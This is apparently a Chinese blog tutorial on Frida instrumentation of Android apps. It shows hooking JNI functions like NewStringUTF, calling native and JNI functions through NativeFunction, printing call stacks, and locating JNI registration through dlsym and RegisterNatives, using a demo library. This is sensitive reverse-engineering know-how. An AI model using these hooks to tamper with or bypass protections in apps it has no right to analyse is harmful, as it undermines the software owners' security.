<p>要获取JNIEnv*指针变量的内存地址，Frida中提供了相应的方法来获取，部分源码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">declare namespace <span class="title class_">Java</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">const</span> <span class="attr">vm</span>: <span class="variable constant_">VM</span>;</span><br><span class="line">	interface <span class="variable constant_">VM</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="title function_">getEnv</span>():<span class="title class_">Env</span>;</span><br><span class="line">		<span class="title function_">tryGetEnv</span>():<span class="title class_">Env</span> | <span class="literal">null</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>getEnv和tryGetEnv都可以返回Frida包装后的JNIEnv对象</strong>，如果没有找到，前者会抛出异常错误，后者会返回一个NULL</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>()));</span><br><span class="line"><span class="comment">//env: &#123;&quot;handle&quot;:&quot;0x76c5e1af30&quot;,&quot;vm&quot;:&#123;&quot;handle&quot;:&quot;0x76d5e07c10&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>handle属性记录的是原始JNIEnv* 指针变量的内存地址，所存放的就是JNIEnv结构体的地址。利用readPointer可以将改内存的数据转化为地址</p>
<p>所以说，获得JNIEnv结构体的地址的最直接的方式</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>.<span class="title function_">readPointer</span>()</span><br></pre></td></tr></table></figure>

<img src="/2022/11/30/JNI%E5%87%BD%E6%95%B0%E7%9A%84Hook%E4%B8%8E%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D/1.png" class="" width="1">

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct <span class="title class_">JNINativeInterface</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	jstring (*<span class="title class_">NewStringUTF</span>)(<span class="title class_">JNIEnv</span>* ,<span class="keyword">const</span> char*);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>env.handle的类型是NativePointer，但env的类型不是，所以不能直接env.NativePointer。但可以通过Memory.readPointer(env)或者ptr(env).NativePointer()来达到目的，推荐使用后者</p>
<h3 id="枚举libart符号表来Hook"><a href="#枚举libart符号表来Hook" class="headerlink" title="枚举libart符号表来Hook"></a>枚举libart符号表来Hook</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_jni</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _symbols = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">var</span> newStringUtf = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; _symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> _symbol = _symbols[i];</span><br><span class="line">        <span class="keyword">if</span>(_symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; _symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStringUTF&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            newStringUtf = _symbol.<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtf, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newStringUtf  args: &quot;</span>, args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newStringUtf  retval: &quot;</span>, retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_jni</span>();</span><br></pre></td></tr></table></figure>

<p>这些api在so层hook都讲过的，都能看懂，只是这过滤了一下包含CheckJNI的符号</p>
<p>再来介绍一下Process.pointerSize这个方法，返回当前进程的指针大小，这样就不用可以去区别32位和64位指针大小的区别了，也解决了因指针大小不一样而导致偏移量不一样的问题。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> envAddr = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>.<span class="title function_">readPointer</span>();</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewStringUTF</span> = envAddr.<span class="title function_">add</span>(<span class="number">167</span> * <span class="title class_">Process</span>.<span class="property">pointerSize</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = envAddr.<span class="title function_">add</span>(<span class="number">167</span> * <span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title class_">NewStringUTF</span>));<span class="comment">//NewStringUTF函数指针的内存地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title class_">NewStringUTFAddr</span>));<span class="comment">//NewStringUTFAddr就是NewStringUTF函数的地址（不是指针的）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(<span class="title class_">NewStringUTFAddr</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure>

<p>当得到了函数地址后，可以通过Frida的API，Instruction.parse(NewStringUTFAddr).toString()方法，可以将指令转化为汇编代码。</p>
<p>Hook代码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_jni2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> envAddr = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>.<span class="title function_">readPointer</span>();</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = envAddr.<span class="title function_">add</span>(<span class="number">167</span> * <span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">NewStringUTFAddr</span>, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FindClass args: &quot;</span>, args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FindClass retval: &quot;</span>, retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_jni2</span>();</span><br></pre></td></tr></table></figure>

<h3 id="利用Frida-API主动调用JNI函数"><a href="#利用Frida-API主动调用JNI函数" class="headerlink" title="利用Frida API主动调用JNI函数"></a><strong>利用Frida API主动调用JNI函数</strong></h3><p>前文提到过，通过Java.vm.tryGetEnv()就可以得到Frida包装过的JNIEnv对象，然后就可以接着通过Frida封装的API来调用JNI函数。</p>
<p>这里需要注意，JNI的函数命名采用大驼峰命名法，Frida封装的采用小驼峰命名法，并且UTF只有首字母大写。</p>
<p>举两个例子：</p>
<ol>
<li>JNI-NewStringUTF；Frida-newStringUtf;</li>
<li>JNI-GetStringUTFChars;Frida-getStringUtfChars</li>
</ol>
<p>其余的到下面的链接看</p>
<p><a target="_blank" rel="noopener" href="https://github.com/frida/frida-java-bridge">https://github.com/frida/frida-java-bridge</a></p>
<p>另外两者的参数也不同，JNI的参数第一个都是JNIEnv*，frida不需要传这个参数</p>
<h3 id="so层文件打印函数栈"><a href="#so层文件打印函数栈" class="headerlink" title="so层文件打印函数栈"></a>so层文件打印函数栈</h3><p>在Frida中可以通过Thread.backtrace来获取函数栈，看看源码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delcare namespace <span class="title class_">Thread</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">backtrace</span>(<span class="params">context?:CpuContext,backtracer?:Backtracer</span>):<span class="title class_">NativePointer</span>[];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">delay:number</span>):<span class="keyword">void</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>backtrace用于获取函数栈，掺入两个可省略的参数，返回NativePointer类型的地址数组，但两个参数不推荐省略。</p>
<p>sleep接受一个数值用于挂起当前线程，并在多少秒后恢复</p>
<p>backtrace参数需要传入BackTracer类型</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">BackTracer</span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="attr">ACCURATE</span>: <span class="title class_">Baktracer</span>;<span class="comment">//这个获取到的信息比较准确，但不是所有情况都适用</span></span><br><span class="line">	<span class="keyword">static</span> <span class="attr">FUZZY</span>: <span class="title class_">Backtracer</span>;<span class="comment">//这个可能不是很准确，但对任何二进制文件都有效</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际情况可以两个都试一下。</p>
<p>DebugSymbol.fromAddress。该方法用于获取对应地址的调试信息</p>
<p>其源码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">DebugSymbol</span>&#123;</span><br><span class="line">	<span class="attr">address</span>: <span class="title class_">NativePointer</span>;    <span class="comment">//符号所在地址</span></span><br><span class="line">	<span class="attr">name</span>: string | <span class="literal">null</span>;       <span class="comment">//符号名</span></span><br><span class="line">	<span class="attr">moduleName</span>: string | <span class="literal">null</span>; <span class="comment">//符号所在模块名</span></span><br><span class="line">	<span class="attr">fileName</span>: string | <span class="literal">null</span>;   <span class="comment">//符号所在的文件名</span></span><br><span class="line">	<span class="attr">lineNumber</span>: number | <span class="literal">null</span>; <span class="comment">//符号在文件里的行号</span></span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">fromAddress</span>(<span class="attr">address</span>: <span class="title class_">NativePointerValue</span>): <span class="title class_">DebugSymbol</span>;   <span class="comment">//通过地址获取符号</span></span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">fromName</span>(<span class="attr">name</span>: string):<span class="title class_">DebugSymbol</span>;                      <span class="comment">//通过名字获取符号</span></span><br><span class="line">	<span class="comment">//传入函数名，返回该函数所在地址；如果有多个同名函数，则返回第一个，没找到则报错。</span></span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">getFunctionByName</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span>;          </span><br><span class="line">	<span class="comment">//传入函数名，以数组形式返回函数地址。</span></span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">findFunctionsNamed</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span>[];       </span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">findFunctionsMatching</span>(<span class="attr">glod</span>:string): <span class="title class_">NativePointer</span>[];     </span><br><span class="line">	<span class="keyword">static</span> <span class="title function_">load</span>(<span class="attr">path</span>:string):<span class="keyword">void</span>; <span class="comment">//加载指定模块中的符号</span></span><br><span class="line">	<span class="title function_">toString</span>():string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来个简单测试</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> debsym = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromName</span>(<span class="string">&quot;strcat&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address: &quot;</span>, debsym.<span class="property">address</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name: &quot;</span>, debsym.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;moduleName: &quot;</span>, debsym.<span class="property">moduleName</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fileName: &quot;</span>, debsym.<span class="property">fileName</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lineNumber: &quot;</span>, debsym.<span class="property">lineNumber</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;toString: &quot;</span>, debsym.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getFunctionByName: &quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">getFunctionByName</span>(<span class="string">&quot;strcat&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findFunctionsNamed: &quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">findFunctionsNamed</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findFunctionsMatching: &quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">findFunctionsMatching</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">address:  0x7896f75230</span></span><br><span class="line"><span class="comment">name:  strcat</span></span><br><span class="line"><span class="comment">moduleName:  libc.so</span></span><br><span class="line"><span class="comment">fileName:</span></span><br><span class="line"><span class="comment">lineNumber:  0</span></span><br><span class="line"><span class="comment">toString:  0x7896f75230 libc.so!strcat</span></span><br><span class="line"><span class="comment">getFunctionByName:  0x7896f75230</span></span><br><span class="line"><span class="comment">findFunctionsNamed:  0x75fd9e1910,0x75fd9a2ee8,0x75fd957fb0,0x75fc0abd90,0x75f0be3070,0x75ec6ad2a0,0x75ecb22020,0x75ec6380b0,0x75ec5c8020,0x75e8b69208,0x75f4620c48</span></span><br><span class="line"><span class="comment">findFunctionsMatching:  0x75e8b69208,0x75ec5c8020,0x75ec6380b0,0x75ec6ad2a0,0x75ecb22020,0x75f0be3070,0x75f4620c48,0x75fc0abd90,0x75fd957fb0,0x75fd9a2ee8,0x75fd9e1910</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="so层主动调用任意函数"><a href="#so层主动调用任意函数" class="headerlink" title="so层主动调用任意函数"></a>so层主动调用任意函数</h3><p>首先介绍一个Frida的API</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">NativeFunction</span>(address,returnType,argTypes[,abi])</span><br></pre></td></tr></table></figure>

<p>该API需要传入函数地址，返回值类型，参数类型数组和可省略的abi数组。</p>
<p>returnTypes和argTypes支持很多种类型: void,pointer,int,uint,(u)long,(u)char,float,double,int8,uint8,(u)int16,(u)int32,(u)int64,bool,size_t,ssize_t</p>
<p>其实传给new NativeFunction的返回值和参数类型不用非常准确也是可以调用函数的</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> funAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x16BC</span>);</span><br><span class="line">    <span class="keyword">var</span> jstr2cstr = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funAddr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">		<span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line"><span class="comment">//主动调用jni函数newStringUtf，将JavaScript的字符串转为Java字符串</span></span><br><span class="line">    <span class="keyword">var</span> jstring = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;xiaojianbang&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> retval = <span class="title function_">jstr2cstr</span>(env.<span class="property">handle</span>, jstring);</span><br><span class="line">    <span class="comment">//var retval = jstr2cstr(env, jstring);</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(retval.<span class="title function_">readCString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//xiaojianbang</span></span><br></pre></td></tr></table></figure>

<p>[,abi]的个数为除了JNI特有的参数外（如JNIEnv*,jclass&#x2F;jobject），函数本身有的参数加一个返回值</p>
<h3 id="通过NativeFunction主动调用JNI函数"><a href="#通过NativeFunction主动调用JNI函数" class="headerlink" title="通过NativeFunction主动调用JNI函数"></a>通过NativeFunction主动调用JNI函数</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>();</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">GetStringUTFCharsAddr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">    <span class="keyword">if</span>(symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStringUTF&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title class_">NewStringUTFAddr</span> = symbol.<span class="property">address</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;GetStringUTFChars&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title class_">GetStringUTFCharsAddr</span> = symbol.<span class="property">address</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewStringUTF</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">NewStringUTFAddr</span>, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">GetStringUTFChars</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">GetStringUTFCharsAddr</span>, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jstring = <span class="title class_">NewStringUTF</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>, <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;xiaojianbang&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jstring);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cstr = <span class="title class_">GetStringUTFChars</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>(),  jstring,  <span class="title function_">ptr</span>(<span class="number">0</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x1</span></span><br><span class="line"><span class="comment">xiaojianbang</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>查看上面两个函数NewStringUTF；GetStringUTFChars在jni中的声明</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct <span class="title class_">JNINativeInterface</span>&#123;</span><br><span class="line">	...</span><br><span class="line">		jstring (*<span class="title class_">NewStringUTF</span>)(<span class="title class_">JNIEnv</span>*,<span class="keyword">const</span> char*);</span><br><span class="line">		<span class="keyword">const</span> char* (*getStringUTFChars)(<span class="title class_">JNIEnv</span>*, jstring,jboolean*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在C语言中，jboolean可以用一个字节的数值代替，故相关代码也可改为以下形式</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cstr = <span class="title class_">GetStringUTFChars</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>(),  jstring,  <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">1</span>).<span class="title function_">writeS8</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="comment">//xiaojianbang</span></span><br></pre></td></tr></table></figure>

<p>而且在使用new NativeFunction声明函数指针时，某些参数与jni.h中不一致也是可以调用的，如GetStringUTFChars，可以只传两个参数</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">GetStringUTFChars</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">GetStringUTFCharsAddr</span>, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> cstr = <span class="title class_">GetStringUTFChars</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>(),  jstring);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="comment">//xiaojianbang</span></span><br></pre></td></tr></table></figure>

<h2 id="JNI函数注册的快速定位"><a href="#JNI函数注册的快速定位" class="headerlink" title="JNI函数注册的快速定位"></a>JNI函数注册的快速定位</h2><ol>
<li>JNI静态注册可以Hook dlsym 静态注册的方式在一开始并没有绑定so层的函数，当Java的native函数首次被调用，系统会按规则构建出对应的函数名，通过dlsym去每一个so文件中寻找符号，找到后进行绑定。</li>
<li>JNI函数动态注册可以Hook RegisterNatives，这个函数就是用来动态注册的，不必多说</li>
<li>Hook其他关键的JNI函数，如NewStringUTF，再打印函数栈。当然也可以试试jnitrace</li>
</ol>
<h3 id="Hook-dlsym"><a href="#Hook-dlsym" class="headerlink" title="Hook dlsym"></a>Hook dlsym</h3><p>dlsym的声明</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * <span class="title function_">dlsym</span>(<span class="keyword">void</span> * handle,<span class="keyword">const</span> char* symbol);</span><br><span class="line"><span class="comment">//第一个参数是dlopen函数之后返回的句柄，第二个是要求获取的函数的名称，返回值是void *，指向函数的地址。</span></span><br></pre></td></tr></table></figure>

<p>handle时使用dlopen函数之后返回的句柄，symbol是要求获取函数的名称，返回值是void* 指向函数的地址。具体看</p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so/dlsym-74aed41582eb45f5b188de2a1127859f">dlsym()</a></p>
